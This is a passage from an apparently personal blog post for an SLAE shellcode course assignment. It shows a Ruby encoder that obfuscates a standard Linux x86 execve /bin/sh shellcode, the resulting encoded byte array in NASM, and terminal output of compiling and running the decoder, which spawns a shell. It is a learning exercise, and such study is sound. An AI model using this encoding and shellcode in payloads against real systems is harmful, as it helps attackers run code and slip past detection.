  <span class="n">EncodedShellcode</span><span class="o">:</span> <span class="kt">db</span> <span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x9</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0xaa</span>
  <span class="n">EncodedShellcodeLen</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">EncodedShellcode</span>
</code></pre></div> <p>The decoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/decode.nasm">here</a>.</p> <h3 id="encoding">Encoding</h3> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>20:10 skawa@skawa-mbp: assignment4 <span class="nv">$ </span>cat encode.rb | grep x31
shellcode <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
20:10 skawa@skawa-mbp: assignment4 <span class="nv">$ </span>ruby encode.rb
<span class="o">[</span>+] C hex format:
<span class="s2">"</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">86</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">f</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">8</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">9</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">aa"</span>;

<span class="o">[</span>+] nasm hex format:
0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa

<span class="o">[</span>+] Total length: 25
20:10 skawa@skawa-mbp: assignment4 <span class="err">$</span>
</code></pre></div> <p>The encoder can be found <a href="https://github.com/skahwah/slae/blob/master/assignment4/encode.rb">here</a>.</p> <h3 id="decoding-and-execution">Decoding and Execution</h3> <p>I built on top of <a href="https://twitter.com/SecurityTube">Vivek's</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find <code class="highlighter-rouge">super-compile.sh</code> <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment4$ </span>ls
decode.nasm  super-compile.sh
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment4$ </span>cat decode.nasm | grep 0xaa
  EncodedShellcode: db 0xe5,0x16,0x86,0xbe,0xe7,0xe7,0xab,0xbe,0xbe,0xe7,0x88,0xb1,0xb4,0x51,0xf,0x9a,0x51,0x8,0x9f,0x51,0x9,0x7a,0xd7,0x15,0xaa
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment4$ </span>./super-compile.sh decode
<span class="o">[</span>+] Assembling with Nasm
<span class="o">[</span>+] Linking
<span class="o">[</span>+] Extracting Opcodes
<span class="o">[</span>+] Creating Shellcode
<span class="o">[</span>+] Compiling Shellcode
<span class="o">[</span>+] Done!
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment4$ </span>ls
decode  decode.nasm  decode.o  shellcode-decode  shellcode-decode.c  super-compile.sh
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment4$ </span>./shellcode-decode
Shellcode Length: 62
<span class="gp">$ </span><span class="nb">exit
</span>skawa@ubuntu:~/Desktop/code/assignment/assignment4<span class="err">$</span>
</code></pre></div> <div class="entry-meta">  <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#ruby" title="Pages tagged ruby" class="tag"><span class="term">ruby</span></a><a href="http://localhost:4000/tags/#encoder" title="Pages tagged encoder" class="tag"><span class="term">encoder</span></a><a href="http://localhost:4000/tags/#decoder" title="Pages tagged decoder" class="tag"><span class="term">decoder</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-4/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-4/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-4/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>  </body>
</html>
